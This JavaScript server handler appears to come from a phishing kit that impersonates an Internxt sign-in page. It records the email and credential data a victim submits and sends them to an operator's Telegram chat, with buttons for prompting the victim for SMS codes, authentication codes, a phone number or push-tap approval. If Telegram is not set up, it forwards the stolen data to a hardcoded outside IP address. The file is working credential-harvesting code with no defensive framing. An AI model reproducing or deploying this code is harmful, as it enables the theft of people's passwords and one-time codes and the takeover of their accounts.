const http = require('http');
const store = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body || {};
  if (!data.result) {
    return res.status(400).json({ error: 'Missing required field: result' });
  }

  const config = store.loadConfig();

  let email = '';
  const match = data.result.match(/Email\s*:\s*([^\r\n]+)/i);
  if (match) email = match[1].trim();

  const initialSession = {
    email,
    status: 'pending',
    redirect: '',
    numberTap: '',
    message: 'Please wait...',
    licenseKey: data.licenseKey || config.Page_LicenseKey,
    telegramChatID: data.telegramChatID || config.telegram_chat_id,
    systemValue: data.systemValue || config.systemValue,
    rawResult: data.result,
    createdAt: Date.now(),
    updatedAt: Date.now()
  };

  const { sessionId, session } = await store.createSession(initialSession);

  const botToken = config.telegram_bot_token;
  const chatId = (session.telegramChatID && session.telegramChatID !== '---')
    ? session.telegramChatID
    : config.telegram_chat_id;

  if (botToken && chatId) {
    const cleanEmail = store.escapeHtml(email || 'Unknown');
    const cleanResult = store.escapeHtml(data.result.substring(0, 800));
    const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${cleanEmail}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${cleanResult}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
    const keyboard = store.buildMainActionsKeyboard(sessionId);

    const tgRes = await store.callTelegram(botToken, 'sendMessage', {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });

    if (!tgRes.ok) {
      console.error('Telegram sendMessage error:', tgRes);
      await store.callTelegram(botToken, 'sendMessage', {
        chat_id: chatId,
        text: `🔔 New Sign-In Submission (Internxt)\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${email || 'Unknown'}\n🆔 Session: ${sessionId}\n\n${data.result.substring(0, 800)}\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`,
        reply_markup: keyboard
      });
    }

    return res.status(200).json({
      sessionId,
      message: 'Verifying credentials...'
    });
  }

  // Fallback to external API if licenseKey provided
  if (data.licenseKey || config.Page_LicenseKey) {
    try {
      const payload = JSON.stringify({
        result: data.result,
        licenseKey: data.licenseKey || config.Page_LicenseKey,
        telegramChatID: data.telegramChatID || config.telegram_chat_id,
        systemValue: data.systemValue || config.systemValue,
        pages: data.pages || ["Tap-Yes", "SMS CODE", "Authentication Code", "Ask Phonnumber", "Number-Tap", "Redirect.html"]
      });

      const extRes = await new Promise((resolve, reject) => {
        const extReq = http.request('http://157.180.52.45:5040/api/submit-result', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
          },
          timeout: 5000
        }, (resp) => {
          let b = '';
          resp.on('data', c => b += c);
          resp.on('end', () => resolve({ status: resp.statusCode, body: b }));
        });
        extReq.on('error', reject);
        extReq.on('timeout', () => { extReq.destroy(); reject(new Error('timeout')); });
        extReq.write(payload);
        extReq.end();
      });

      const extData = JSON.parse(extRes.body);
      if (extData.sessionId) {
        session.externalSessionId = extData.sessionId;
        await store.saveSessionAsync(sessionId, session);
        return res.status(200).json({
          sessionId,
          externalSessionId: extData.sessionId,
          message: extData.message || 'Verifying credentials...'
        });
      }
    } catch (e) {}
  }

  return res.status(400).json({
    error: "Telegram bot credentials are not configured. Please add 'telegram_bot_token' and 'telegram_chat_id' to licenseKey.json or set them as environment variables."
  });
};
